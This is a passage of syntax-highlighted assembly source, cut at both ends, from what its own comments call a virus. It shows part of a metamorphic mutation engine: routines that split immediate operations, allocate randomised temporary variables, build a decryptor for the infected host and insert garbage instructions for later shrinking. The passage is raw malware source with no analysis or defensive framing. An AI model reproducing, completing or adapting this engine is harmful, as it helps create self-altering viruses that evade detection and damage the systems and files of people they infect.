                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return_NoError</span><span class="sc0">

   </span><span class="sc5">@@Double_OP_ADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; Calculate the 2nd Imm for ADD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_OR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Calculate the two Imms for OR+OR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_AND</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; Calculate the two Imms for AND+AND</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_OP_OP</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_XOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; Calculate the two Imms for XOR+XOR</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_OP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; Make OP Mem/Reg,Imm1 + OP Mem/Reg,Imm2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_FlagRegOrMem</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP_OP_MakeReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">    </span><span class="sc1">; Make OP Mem,Imm1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">    </span><span class="sc1">; Make OP Mem,Imm2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return_NoError</span><span class="sc0">
   </span><span class="sc5">@@Double_OP_OP_MakeReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">    </span><span class="sc1">; Make OP Reg,Imm1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">    </span><span class="sc1">; Make OP Reg,Imm2</span><span class="sc0">
   </span><span class="sc5">@@Return_NoError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc5">@@Return_Error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_MakeComposedOPImm</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function increases the recursivity level and returns the result in</span><span class="sc0">
</span><span class="sc1">;; EAX (as a side level :).</span><span class="sc0">
</span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_RecurseLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_RecurseLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function restores the previous saved operation and decreases the</span><span class="sc0">
</span><span class="sc1">;; recursivity level previously increased.</span><span class="sc0">
</span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
</span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">    </span><span class="sc1">; No return! Continue directly</span><span class="sc0">
                                            </span><span class="sc1">; to the next function</span><span class="sc0">

</span><span class="sc1">;; This is an entrypoint for decreasing only the recursivity level (with no</span><span class="sc0">
</span><span class="sc1">;; function restoration).</span><span class="sc0">
</span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_RecurseLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_RecurseLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This code copies the indexes and the addition of the current used memory</span><span class="sc0">
</span><span class="sc1">;; address to the appropiated fields of the current instruction at &lt;EDI&gt;.</span><span class="sc0">
</span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to save the current operation into the stack</span><span class="sc0">
</span><span class="sc5">Xp_SaveOperation</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; Return address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; Save all the values of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; the current operation</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; Push again the return address</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_SaveOperation</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to restore the current operation from the stack</span><span class="sc0">
</span><span class="sc5">Xp_RestoreOperation</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; Return address</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Restore all the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; previously stored in the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_RestoreOperation</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Allocate a temporary variable. The variable is marked in the memory section</span><span class="sc0">
</span><span class="sc1">;; dedicated to that marks, to avoid its reusing. Since we have a data section</span><span class="sc0">
</span><span class="sc1">;; of 128 Kb, we have 16384 temporary variables to use (more than sufficient</span><span class="sc0">
</span><span class="sc1">;; for this virus). If what we are doing is expanding a decryptor code, then</span><span class="sc0">
</span><span class="sc1">;; we only use the first 4 Kb of the memory frame (the memory that we'll have</span><span class="sc0">
</span><span class="sc1">;; available in the host).</span><span class="sc0">
</span><span class="sc5">Xp_GetTempVar</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
    </span><span class="sc5">@@VariableCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FFF8h</span><span class="sc0">       </span><span class="sc1">; Mask the value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreatingADecryptor</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; If we are making a decryptor, then</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Normal1</span><span class="sc0">           </span><span class="sc1">; we only get variables from the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00FF8h</span><span class="sc0">       </span><span class="sc1">; first 4 Kb and avoiding the first</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; 32 bytes (used by the decryptor</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Add20</span><span class="sc0">             </span><span class="sc1">; for making its operations) and the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F00h</span><span class="sc0">        </span><span class="sc1">; last 100h bytes (a random offset</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Normal1</span><span class="sc0">           </span><span class="sc1">; that we set at decryptor creation)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">@@Add20</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc5">@@Normal1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Look if it's already marked.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; If it is, Get the next one and</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@VariableFound</span><span class="sc0">     </span><span class="sc1">; look again.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@VariableCheck</span><span class="sc0">
    </span><span class="sc5">@@VariableFound</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; When we find an unallocated one,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; we mark it.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Now we get an internal random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; offset from 0 to 3 and we add it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; to the address.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreatingADecryptor</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Normal2</span><span class="sc0">           </span><span class="sc1">; If we are making a decryptor, we</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; set no_reg as</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; index register.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">; If not, we translate</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Continue</span><span class="sc0">                     </span><span class="sc1">; the delta register and</span><span class="sc0">
    </span><span class="sc5">@@Normal2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; we set it, so the var</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; is [DLT_REG+xxx]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_TranslateRegister</span><span class="sc0">
    </span><span class="sc5">@@Continue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the index1 register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the index2 as &lt;no_reg&gt;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_GetTempVar</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function generates garbage instructions that will be eliminated by the</span><span class="sc0">
</span><span class="sc1">;; shrinker. They are compressed to NOPs.</span><span class="sc0">
</span><span class="sc5">Xp_InsertGarbage</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">             </span><span class="sc1">; Get a random method</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
